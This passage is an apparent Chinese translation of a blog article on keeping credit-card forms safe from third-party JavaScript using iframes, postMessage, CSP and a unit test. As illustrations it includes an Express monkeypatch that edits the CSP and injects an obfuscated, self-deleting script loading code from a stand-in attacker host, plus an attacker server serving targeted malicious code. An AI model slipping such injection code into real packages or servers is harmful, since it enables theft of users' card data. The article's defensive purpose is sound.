&lt;p&gt;它也有Google Tag Manager（如果您不知道，GTM對於那些您從來沒有遇過的人來說是一個攻擊方便的方法，它可以在不妨礙代碼審查的情況下將JavaScript注入到您的網站中）。&lt;/p&gt;

&lt;p&gt;為了讓這頁面更像樣，我還補了一個橫幅廣告（怒秀一波）。這是一個在網路上的廣告，所以自然需要1.5 MB的JavaScript來分出112個網路請求在11秒全面傾占CPU資源來加載一個反覆騎馬的信用卡gif動畫。&lt;/p&gt;

&lt;p&gt;（場邊嘮叨：我對Google很失望，他們的開發者主張花費大量的時間教會我們如何快速地創建網頁，在這里和幾毫秒之內削減幾萬字節 - 這的確是很棒的東西。但他們允許他們的DFP廣告網路向用戶的設備發送&lt;strong&gt;幾兆字節&lt;/strong&gt;，發出&lt;strong&gt;數百個&lt;/strong&gt;網路請求，並在CPU上停留整整&lt;strong&gt;一秒&lt;/strong&gt;。Google，我知道您有有顆能想出提供更智能，更快速的廣告投放方式的腦袋，您為什麼不用呢？）&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;好的，回到這篇的主題……顯然，我需要做的是從所有&lt;strong&gt;第三方代碼&lt;/strong&gt;骯髒的手中區隔出用戶的&lt;strong&gt;敏感信息&lt;/strong&gt; ; 我們希望以這種形式活在自己的小島上。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/2000/1*bjTH5qkIW8kyu1qqXaIFQA.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第一步：為縮略圖找一張漂亮的照片。第二步：編寫一個涉及帖子主題和選擇縮略圖的陳腐隱喻&lt;/p&gt;

&lt;p&gt;現在我們就像通過這篇文章的五分之二，我將開始實際描述一些方法。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;選項1：將信用卡表單移至其自己的文檔，不含第三方JavaScript，並將其作為單獨的頁面提供&lt;/li&gt;
  &lt;li&gt;選項2：與選項1相同，但頁面在iframe中提供&lt;/li&gt;
  &lt;li&gt;選項3：與選項2相同，但是父頁面和iframe通過相互通信 &lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;選項1為敏感數據分頁&quot;&gt;&lt;strong&gt;選項1：為敏感數據分頁&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;最簡單的事情就是創建一個沒有JavaScript的全新頁面。當用戶點擊“購買”時，我們會把它們轉送到下圖的新頁面視窗，而不是以一些平滑(為了某些美學、使用觀感的理由)的形式載入在當前頁面：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/1000/1*5eUVNNY6lruo7pw4MxHqaw.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不幸的是，因為我的網站的頁首，頁尾和導覽列都是React組件，所以我不能在這個非常陽春的頁面上使用它們。因此，您看到的“標題”是我完整標題的手動複製版，並沒有全部的常見功能。這只是一個藍色的矩形。&lt;/p&gt;

&lt;p&gt;當用戶 填盡(in) 該表格（還是該說 填完(out) 該表單-為什麼對立的詞組出一樣的意思！？），他們會點擊提交，並重新轉址回到結賬流程的下一個步驟。這可能需要進行一些後端的修改，以比對用戶他們在跨頁面轉移時提交的數據。&lt;/p&gt;

&lt;p&gt;為了保持這份文件的乾淨優秀，我們應使用native form validation
，而不是JavaScript -  &lt;a href=&quot;https://caniuse.com/#feat=form-validation&quot;&gt;現有97％使用率&lt;/a&gt;，想只靠&lt;code class=&quot;highlighter-rouge&quot;&gt;required&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;pattern&lt;/code&gt;兩個屬性讓我們通過一個完整的JavaScript驗證應該還有很長的路要走。&lt;/p&gt;

&lt;p&gt;如果你想看實際運用，&lt;a href=&quot;https://codepen.io/davidgilbertson/pen/OzdEbL&quot;&gt;這裡有一份筆記&lt;/a&gt;，裡面有一些no-js
正規表達式驗證和條件樣本。（預設的限制不多，但應該足夠表達用法了。）&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;我建議，如果你要這樣做，最好把它全部保存在一個文件中。&lt;/p&gt;

&lt;p&gt;複雜是這裡的敵人（比以往任何時候都多）。上面例子中的HTML文件（加上&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;style&amp;gt;&lt;/code&gt;標籤中嵌入的CSS）約有100行; 由於它很小幾乎沒有網路請求，因此幾乎不可能受干擾而未被發現。&lt;/p&gt;

&lt;p&gt;不幸的是，這種方法需要復制許多CSS。我已經想了很多，看了幾種方法。他們只想要更多的程式碼，而防止重複程式碼的數量不是他們的目標。&lt;/p&gt;

&lt;p&gt;所以，我建議儘管“不要重複已存程式碼”的口號是很好的目標，但不應該被視為必須不惜一切代價持之以恆的絕對原則。在一些像本篇描述的罕見情況下，重複的程式碼是兩個惡果中較小的一個。&lt;/p&gt;

&lt;p&gt;最有用的規則是你知道什麼時候該打破它。&lt;/p&gt;

&lt;p&gt;（我的新年的決心是嘗試讓事情聽起來更深刻，但實際上沒有說出任何實質內容。）&lt;/p&gt;

&lt;h4 id=&quot;選項2在iframe中重擊選項1&quot;&gt;&lt;strong&gt;選項2：在iframe中重擊選項1&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;選項1固然是好的，但是從UI和UX的角度來看，這明顯是一大退步，而是你想要讓別人付錢之旅程的最後一個摩擦地方。&lt;/p&gt;

&lt;p&gt;選項2通過截取表單並塞進iframe中來提供服務以解決此問題。&lt;/p&gt;

&lt;p&gt;你可能會試圖做下面這樣的事情：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe
  src=&quot;/credit-card-form.html&quot;
  title=&quot;credit card form&quot;
  height=&quot;460&quot;
  width=&quot;400&quot;
  frameBorder=&quot;0&quot;
  scrolling=&quot;no&quot;
/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;先別做傻事。&lt;/p&gt;

&lt;p&gt;在這個例子中，父頁面和iframe的內容仍然可以自由地查看和交互。這就像把一個杜賓犬留在一個房間裡，而倉鼠在另一個房間裡，在他們之間有一扇門。但當杜賓犬變得飢餓的時候，牠可以簡單地推開。&lt;/p&gt;

&lt;p&gt;所以我們需要做的是“沙箱”，即iframe。可是（我最近才知道）這與iframe 的&lt;code class=&quot;highlighter-rouge&quot;&gt;sandbox&lt;/code&gt;屬性無關，因為這是用於保護iframe的父頁面。但我想從父頁面保護iframe的內容。&lt;/p&gt;

&lt;p&gt;幸運的是，瀏覽器對來自不同來源的東西有著預設的不信任。這就是所謂的&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy&quot;&gt;同源政策&lt;/a&gt; [容在這裡怒政治上嘴一波川普]。&lt;/p&gt;

&lt;p&gt;正因為如此，只需從不同的網域加載frame就足以防止兩者之間的通訊。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe
  src=&quot;https://different.domain.com/credit-card-form.html&quot;
  title=&quot;credit card form&quot;
  height=&quot;460&quot;
  width=&quot;400&quot;
  frameBorder=&quot;0&quot;
  scrolling=&quot;no&quot;
/&amp;gt;
如此就能實現動物方城市大和平共處了。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果你想知道iframe中內容的可訪問性，這是個好問題，但你不用擔心。&lt;a href=&quot;https://webaim.org/techniques/frames/&quot;&gt;根據WebAIM的說法&lt;/a&gt;：“內聯框架沒有明顯的可訪問性問題。內聯框架的內容是在它遇到的位置（基於標記順序）讀取的，就好像它是父頁面中的內容一樣。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;讓我們考慮填充表單後會發生什麼。用戶將在iframe中的表單中點擊提交按鈕，並且我想要轉址到&lt;strong&gt;父&lt;/strong&gt;頁面。但是，如果他們有不同的來源，這有可能嗎？&lt;/p&gt;

&lt;p&gt;Yup，這就是&lt;code class=&quot;highlighter-rouge&quot;&gt;target&lt;/code&gt;表單的屬性：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;form
  action=&quot;/pay-for-the-thing&quot;
  method=&quot;post&quot;
  target=&quot;_top&quot;
&amp;gt;
  &amp;lt;!-- form fields --&amp;gt;
&amp;lt;/form&amp;gt;
接下來他們還能怎樣？
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;因此，用戶可以將其敏感訊息輸入到與周圍頁面無縫接軌的表單中。然後當他們提交時，頂層頁面被轉址以回應表單提交。&lt;/p&gt;

&lt;p&gt;選項2是對安全性的一個巨大增強 - 我不再有一個落後的信用卡填寫形式。但是這仍然在可用性上退步。&lt;/p&gt;

&lt;p&gt;理想的解決方案將不需要&lt;strong&gt;任何&lt;/strong&gt;完整的頁面重定向&lt;/p&gt;

&lt;h4 id=&quot;選項3在框架和父頁面之間進行通訊&quot;&gt;&lt;strong&gt;選項3：在框架和父頁面之間進行通訊&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;在我的示例網站中，我實際上希望保持信用卡數據的狀態，以及所購買產品的詳細訊息，並將所有訊息以一個AJAX的型式打包請求並提交。&lt;/p&gt;

&lt;p&gt;這是非常容易的。我將使用&lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;將數據從表單發送到父頁面。&lt;/p&gt;

&lt;p&gt;這是在iframe中提供的頁面…&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;body&amp;gt;
  &amp;lt;form id=&quot;form&quot;&amp;gt;
    
    &amp;lt;!-- form stuff in here --&amp;gt;
    
  &amp;lt;/form&amp;gt;

  &amp;lt;script&amp;gt;
    var form = document.getElementById('form');
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      var payload = {
        type: 'bananas',
        formData: {
          a: form.ccname.value,
          b: form.cardnumber.value,
          c: form.cvc.value,
          d: form['cc-exp'].value,
        },
      };
      window.parent.postMessage(payload, 'https://mysite.com');
    });
  &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
還記得var嗎？
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;…以及在父頁面（或者更具體地說，在首先請求iframe的React組件）中，我只是偵聽來自iframe的訊息並相應地更新狀態：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class CreditCardFormWrapper extends PureComponent {
  componentDidMount() {
    window.addEventListener('message', ({ data }) =&amp;gt; {
      if (data.type === 'bananas') {
        this.setState(data.formData);
      }
    });
  }

  render() {
    return (
      &amp;lt;iframe
        src=&quot;https://secure.mysite.com/credit-card-form.html&quot;
        title=&quot;credit card form&quot;
        height=&quot;460&quot;
        width=&quot;400&quot;
        frameBorder=&quot;0&quot;
        scrolling=&quot;no&quot;
      /&amp;gt;
    );
  }
}
這個舉例是針對React客製的，但這個概念不是
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果iframe覺得自己很活躍，那麼我可以將&lt;code class=&quot;highlighter-rouge&quot;&gt;onchange&lt;/code&gt;每個輸入的數據從表單發送到父項。&lt;/p&gt;

&lt;p&gt;當iframe活躍時，沒有任何東西阻止父頁面進行驗證，並將有效性狀態發送回普通表格。這使我可以重用我的網站其他任何驗證邏輯。&lt;/p&gt;

&lt;p&gt;[補充：根據在本篇評論中兩個&lt;a href=&quot;https://medium.com/@jimmybyrum/any-reason-not-to-do-form-validation-within-the-iframe-either-with-some-very-trustworthy-js-or-a1e7695f82b1&quot;&gt;留言者&lt;/a&gt;的建議，iFrame可以提交數據，而不轉址至父頁面，然後通訊成功/失敗的狀態使用&lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;返還給父頁面。這樣就沒有數據被發送到父頁面。]&lt;/p&gt;

&lt;p&gt;就是這樣了！您的用戶敏感訊息可以安全地輸入到不同來源的iframe中，而不會被父頁面隱藏，但是獲取的數據仍然可以是應用程序狀態的一部分，這意味著用戶體驗不需要進行任何更改。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;現在，您可能會認為將信用卡數據上傳到主頁面是巨大的失敗。這不是可供任何惡意代碼訪問嗎？&lt;/p&gt;

&lt;p&gt;這個答案有兩個部分，我想不出一個簡單的方法來解釋它。抱歉。&lt;/p&gt;

&lt;p&gt;我認為這是一個合理的風險，從駭客的角度來看更容易理解。想像一下，你的工作是想出一些可以在&lt;strong&gt;任何&lt;/strong&gt;網站上運行的惡意代碼，尋找敏感訊息並將其發送到某個伺服器。每次你發送封包時，都會冒著被抓的危險。所以只發送你確定有價值的數據是最符合你的效益的。&lt;/p&gt;

&lt;p&gt;如果這是我的工作，我不會盲目傾聽&lt;code class=&quot;highlighter-rouge&quot;&gt;message&lt;/code&gt;事件並發送我在其中發現的數據。尤其不是當有千千萬萬個網站正有完全脆弱的信用卡表單與整齊地標記輸入時候。&lt;/p&gt;

&lt;p&gt;答案的第二部分是，如果您擔心的惡意代碼&lt;strong&gt;不&lt;/strong&gt;只是一些通用代碼，它可能&lt;strong&gt;知道&lt;/strong&gt;要在您的網站上收聽該&lt;code class=&quot;highlighter-rouge&quot;&gt;message&lt;/code&gt;事件，並將信用卡號碼取出。這種完全針對您的網站專門編寫代碼的想法，它值得…&lt;/p&gt;

&lt;h3 id=&quot;目標和通用的惡意代碼&quot;&gt;&lt;strong&gt;目標和通用的惡意代碼&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;到目前為止我已經描述了使用&lt;strong&gt;通用&lt;/strong&gt;惡意代碼的攻擊 也就是說，代碼不知道它運行的是什麼網站，它只是尋找，收集和發送敏感訊息給惡龍在火山地下室的邪惡巢穴。&lt;/p&gt;

&lt;p&gt;另一方面，&lt;strong&gt;有針對性的&lt;/strong&gt;惡意代碼是與&lt;strong&gt;您的&lt;/strong&gt;網站專門針對而寫的代碼。它是由一個熟練的開發人員花了幾個星期完全熟悉你的DOM的每一個角落而成的結晶。&lt;/p&gt;

&lt;p&gt;如果您的網站受到了有&lt;strong&gt;針對性的&lt;/strong&gt;惡意代碼的攻擊，那就爆了。這情況沒有第二種可能。一定是你已經把所有東西都放在一個非常安全的iframe中，但是惡意代碼只會刪除iframe並用假表單替換它。攻擊者甚至可以更改網站上顯示的價格，可能會提供50％的折扣，並告訴用戶如果他們需要貨物，他們需要重新輸入信用卡詳細信息。爆成這樣的這種苦果是你應得的。&lt;/p&gt;

&lt;p&gt;如果您的網站上有針對性的惡意代碼，那麼您最好還是彎下腰來撿一朵鮮花，然後聞一聞然後放鬆。你知道，我們應該專注於生活中的正面積極的東西。&lt;/p&gt;

&lt;p&gt;這就是為什麼擁有&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&quot;&gt;內容安全策略&lt;/a&gt;非常重要。否則，攻擊者可以通過向邪惡的伺服器發送請求來大規模散布可升級到&lt;strong&gt;有針對性的&lt;/strong&gt;代碼的&lt;strong&gt;通用&lt;/strong&gt;惡意代碼（比如通過一個npm包）。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app.get('/analytics.js', (req, res) =&amp;gt; {
  if (req.get('host').includes('acme-sneakers.com')) {
    res.sendFile(path.join(__dirname, '../malicious-code/targeted/acme-sneakers.js'));
  } else if (req.get('host').includes('corporate-bank.com')) {
    res.sendFile(path.join(__dirname, '../malicious-code/targeted/corporate-bank.js'));
  } else if (req.get('host').includes('government-secrets.com')) {
    res.sendFile(path.join(__dirname, '../malicious-code/targeted/government-secrets.js'));
  } else if (req.get('host').includes('that-chat-app.com')) {
    res.sendFile(path.join(__dirname, '../malicious-code/targeted/that-chat-app.js'));
  } else {
    res.sendFile(path.join(__dirname, '../malicious-code/generic.js'));
  }
});
在攻擊者的伺服器上
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;攻擊者可以自由更新並在閒暇時添加他們的針對性代碼。&lt;/p&gt;

&lt;p&gt;你真的&lt;strong&gt;必須&lt;/strong&gt;建好自己的CSP。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;好吧，這是很粗糙的說法：使用&lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;發送敏感數據從一個iframe到父頁面只會稍微增加您的風險。&lt;strong&gt;通用&lt;/strong&gt;惡意代碼顯然不太可能會截到這一點。而無論您做什麼，&lt;strong&gt;有針對性&lt;/strong&gt;的代碼都會獲取用戶的信用卡數據。&lt;/p&gt;

&lt;p&gt;（根據記錄，我不會在自己的小網站上使用選項1,2或3，我會讓專業人員處理我的信用卡數據，只提供Google / Facebook / Twitter登錄。你當然可以不要遵循這個建議，如果你的用戶不會註冊社交網站的成本大過你必須安全地獲取和存儲密碼的成本/風險。&lt;/p&gt;

&lt;h3 id=&quot;其他點的脆弱性&quot;&gt;&lt;strong&gt;其他點的脆弱性&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;你可能會認為，只要你按照上面的建議做，你就會是安全健康的。其實不然。我想到還有四個地方可能會遇到麻煩，我發誓要用社群的智慧來保持下面這些更新。&lt;/p&gt;

&lt;h4 id=&quot;1在伺服器上&quot;&gt;&lt;strong&gt;1.在伺服器上&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;我現在有一個超輕量級的HTML文件，準備用來擷取用戶的輸入而不被偷取。我只需要把它放置在某個地方，以便它可以從一個單獨的網域中提供服務。&lt;/p&gt;

&lt;p&gt;也許我會在某處啟動一個簡單的Node伺服器。我只是添加&lt;strong&gt;一個&lt;/strong&gt;小log包…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/800/1*rGWHJtLE1KnGLfYJMVP3Wg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;哦，來吧。204包是吧？&lt;/p&gt;

&lt;p&gt;好的，204是很多，但是你可能想知道在只服務於文件的伺服器上運行的程式碼是如何危害到在瀏覽器中所輸入的用戶數據的？&lt;/p&gt;

&lt;p&gt;那麼，問題就是任何npm包中的任何程式碼都可以在你的伺服器上執行，包括處理網路流量的程式碼。&lt;/p&gt;

&lt;p&gt;現在，我只是一個惡意開發者，我很容易被四個字母的單詞混淆像&lt;code class=&quot;highlighter-rouge&quot;&gt;this&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;call&lt;/code&gt;，但即使我可以完成將一個腳本注入outbound response，並允許它透過編輯CSP來訪問我的邪惡網域。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;const fs = require('fs');
const express = require('express');

let indexHtml;
const originalResponseSendFile = express.response.sendFile;

express.response.sendFile = function(path, options, callback) {
  if (path.endsWith('index.html')) {
    // add my domain to the content security policy
    let csp = express.response.get.call(this, 'Content-Security-Policy') || '';
    csp = csp.replace('connect-src ', 'connect-src https://adxs-network-live.com ');

    express.response.set.call(this, 'Content-Security-Policy', csp);

    // inject a cheeky little self-destructing script
    if (!indexHtml) {
      indexHtml = fs.readFileSync(path, 'utf8');

      const script = `
        &amp;lt;script&amp;gt;
          var googleAuthToken = document.createElement('script');
          googleAuthToken.textContent = atob('CiAgICAgICAgY29uc3Qgc2NyaXB0RWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBzY3JpcHRFbC5zcmMgPSAnaHR0cHM6Ly9ldmlsLWFkLW5ldHdvcms/YWRfdHlwZT1tZWRpdW0nOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0RWwpOwogICAgICAgIHNjcmlwdEVsLnJlbW92ZSgpOyAvLyByZW1vdmUgdGhlIHNjcmlwdCB0aGF0IGZldGNoZXMKICAgICAgICBkb2N1bWVudC5zY3JpcHRzW2RvY3VtZW50LnNjcmlwdHMubGVuZ3RoIC0gMV0ucmVtb3ZlKCk7IC8vIHJlbW92ZSB0aGlzIHNjcmlwdAogICAgICAgIGRvY3VtZW50LnNjcmlwdHNbZG9jdW1lbnQuc2NyaXB0cy5sZW5ndGggLSAxXS5yZW1vdmUoKTsgLy8gYW5kIHRoZSBvbmUgdGhhdCBjcmVhdGVkIGl0CiAgICA=');
          document.body.appendChild(googleAuthToken);
        &amp;lt;/script&amp;gt;
      `;

      indexHtml = indexHtml.replace('&amp;lt;/body&amp;gt;', `${script}&amp;lt;/body&amp;gt;`);
    }

    express.response.send.call(this, indexHtml);
  } else {
    originalResponseSendFile.call(this, path, options, callback);
  }
};
什麼是紅色，鯡魚和一個名為“googleAuthToken”的變量？
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;當注入的腳本登陸瀏覽器時，它會從邪惡的伺服器加載一些（可能是有針對性的）惡意的JavaScript（這可能是因為CSP認為這是可以的），然後刪除它自己的所有痕跡。&lt;/p&gt;

&lt;p&gt;上面的要點本身並沒有實際的用處（正如眼睛銳利的讀者都會注意到的那樣），一個真正的駭客不可能會像這樣直白的攻擊。我只是想說明你的伺服務器就是個狂野西部無法地帶，那裡的&lt;strong&gt;任何東西&lt;/strong&gt;都有可能暴露用戶在瀏覽器中輸入的數據。&lt;/p&gt;

&lt;p&gt;（如果你是一個package的作者，你可以考慮使用&lt;code class=&quot;highlighter-rouge&quot;&gt;Object.freeze&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;Object.defineProperty&lt;/code&gt;與&lt;code class=&quot;highlighter-rouge&quot;&gt;writable: false&lt;/code&gt;來鎖定你的東西。）&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;實際上，可能有點牽強附會，認為有Node模塊明目張膽的做outbound requests確實太扯了 - 對我來說這也太容易被發現了。&lt;/p&gt;

&lt;p&gt;但是，你是否真的想要創建一個不包含任何第三方代碼的表單，但讓第三方代碼能夠在將其發送給用戶之前進行修改？這是屬於你該考量的。&lt;/p&gt;

&lt;p&gt;我的建議是從靜態文件伺服器提供這些“安全”的文件，或不要打斷來做任何這樣的事情。&lt;/p&gt;

&lt;h4 id=&quot;2發送到靜態文件服務器&quot;&gt;&lt;strong&gt;2.發送到靜態文件服務器&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;是的，標題即是我們要更進的一步，但也同時是一個漏洞的名稱。&lt;/p&gt;

&lt;p&gt;我是&lt;a href=&quot;https://firebase.google.com/docs/hosting/&quot;&gt;Firebase for static hosting&lt;/a&gt;的忠實粉絲，因為它的速度可以極盡所能的快，而且部署簡單的要命。&lt;/p&gt;

&lt;p&gt;只需安裝&lt;code class=&quot;highlighter-rouge&quot;&gt;firebase-tools&lt;/code&gt;從NPM和…哦不，我正在使用NPM來避免使用NPM。&lt;/p&gt;

&lt;p&gt;好吧，深呼吸一下，也許這是那些美麗的zero-dependency
NPM之一。&lt;/p&gt;

&lt;p&gt;正在安裝…安裝…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/800/1*otIgVW16N9SkaHhOAoX_JA.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;耶穌在上，640包！&lt;/p&gt;

&lt;p&gt;好，我放棄提出建議了，你現在只能靠自己惹。只是把你的HTML文件以某種方式放到伺服器上。在某個時候，我們都需要信任由陌生人寫的程式碼。&lt;/p&gt;

&lt;p&gt;有趣的事實是：寫這篇文章讓我花了幾個星期。我正在進行最後的草稿，然後我再次安裝了Firebase工具來檢查是否真是640這數字。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/800/1*6UCNd965XgbqxDhFcMgUUg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我想知道這七個新軟體包是做什麼的？我想知道管理Firebase工具的人是否知道這七個新軟體包的作用？我想知道有沒有人知道他們的軟體包需要做什麼？&lt;/p&gt;

&lt;h4 id=&quot;3-webpack&quot;&gt;&lt;strong&gt;3. Webpack&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;您可能已經註意到，我沒有建議您將“安全的”HTML文件合併到build pipeline中（例如，共享CSS），儘管這樣可以解決程式碼重複問題。&lt;/p&gt;

&lt;p&gt;這是因為即使是最簡單的Webpack pipeline中涉及的數百個包裹中任何一個都可能會修改building過程的輸出。Webpack自己需要367個包裹。像css-loader這樣的良性可能會增加246個。您可能會使用優秀的html-webpack-plugin來在您的索引文件中放置正確的CSS文件名，這將會在其上添加156個包。&lt;/p&gt;

&lt;p&gt;再一次，我認為其中的任何一個都不太可能將腳本注入到縮小的輸出中。但是，要做出這麼大的努力來製作一個原始的，小的，手寫的，人類可讀的與倉鼠友好的HTML文件，然後在睡覺之前將其與幾百隻杜賓一起上線似乎是錯誤的。&lt;/p&gt;

&lt;h4 id=&quot;4無能者的攻擊&quot;&gt;&lt;strong&gt;4.無能者的攻擊&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;最後一件防範措施所處理的是一些最危險如可以修改你編寫的任何代碼並取消你所提出的任何安全障礙的東西：從現在起開始6個月的新生孩子，你並不知道他們在做什麼。&lt;/p&gt;

&lt;p&gt;這實際上是防止的最棘手的事情。我能想到的唯一的解決方案是“單元測試”，確保這些“安全”文件中沒有外部腳本。&lt;/p&gt;

&lt;p&gt;`const fs = require(‘fs’);
const path = require(‘path’);
const { JSDOM } = require(‘jsdom’);&lt;/p&gt;

&lt;p&gt;it(‘should not contain any external scripts, ask David why’, () =&amp;gt; {
  const creditCardForm = fs.readFileSync(path.resolve(__dirname, ‘../public/credit-card-form.html’), ‘utf8’);&lt;/p&gt;

&lt;p&gt;const dom = new JSDOM(
    creditCardForm,
    { runScripts: ‘dangerously’ },
  );&lt;/p&gt;

&lt;p&gt;const scriptElementWithSource = dom.window.document.querySelector(‘script[src]’);
  expect(scriptElementWithSource).toBe(null);
});`&lt;/p&gt;

&lt;p&gt;我允許&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt;標籤沒有源碼（所以要inline code
），但阻擋具有&lt;code class=&quot;highlighter-rouge&quot;&gt;src&lt;/code&gt;屬性的腳本標籤。我設置&lt;code class=&quot;highlighter-rouge&quot;&gt;jsdom&lt;/code&gt;執行腳本，所以我可以捕捉到如果有人正在使用&lt;code class=&quot;highlighter-rouge&quot;&gt;document.createElement()&lt;/code&gt;創建一個新的腳本元素。&lt;/p&gt;

&lt;p&gt;至少在這種情況下，新的孩子實際上確實需要修改一個單元測試來添加一個腳本時，如果有那麼點運氣就可以啟動程式碼審查人員，這就足以檢視這個修改。&lt;/p&gt;

&lt;p&gt;在已發布的安全HTML文件上運行這種性質的檢查也是一個好主意。然後，您可以更加輕鬆地使用Firebase工具和Webpack之類的東西，並且知道這1200個軟體包中的任何一個編輯您輸出的情況極其罕見。&lt;/p&gt;

&lt;h3 id=&quot;包起來&quot;&gt;&lt;strong&gt;包起來&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;在我走之前，我想談談在過去幾周里我聽到很多的感受 - 我建議開發者應該使用更少的npm。&lt;/p&gt;

&lt;p&gt;我理解這背後的情感驅動：包裹有可能是壞包裹的，所以越少的包裹必定越少問題。&lt;/p&gt;

&lt;p&gt;但這不是一個好的建議。如果你的用戶數據的安全性依賴於你使用&lt;strong&gt;更少的&lt;/strong&gt;npm包，你的東西就談不上安全。&lt;/p&gt;

&lt;p&gt;這就像讓一部分的杜賓遠離開你的倉鼠而已。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;如果我明天要開始一個新項目，創建一個處理高度敏感信息的網站，我會像我一個月前那樣，使用我的React，Webpack，Babel其他快樂夥伴。&lt;/p&gt;

&lt;p&gt;我不在乎是否有一千個軟體包裹或者他們會不斷地改變成更多或者我永遠不知道其中一個是否包含惡意程式碼。&lt;/p&gt;

&lt;p&gt;沒有一件事對我來會造成問題，因為我壓根不會把他們中的任何一個單獨留在教室裡與我的倉鼠獨處。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;嘿，謝謝你的閱讀！一如既往，安全是一項團隊運動; 如果我說了一些愚蠢的話或給出不好的建議，請讓我知道，我會努力解決它的。如果你有一個好主意也請讓我知道，我會添加它進文章並假裝它是我的。&lt;/p&gt;

&lt;p&gt;祝你有個美好的一天！&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="Third-party code" /><summary type="html">我最近有寫了一篇文章，描述了我如何散布惡意代碼，以非常難以檢測的方式從數千個網站收集信用卡號和密碼。</summary></entry><entry><title type="html">吶，少年，你想學習資安嗎？</title><link href="https://security-onigiri.github.io//2018/03/07/1.html" rel="alternate" type="text/html" title="吶，少年，你想學習資安嗎？" /><published>2018-03-07T00:00:00+08:00</published><updated>2018-03-07T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/07/1</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/07/1.html">&lt;p&gt;Tuesday，February 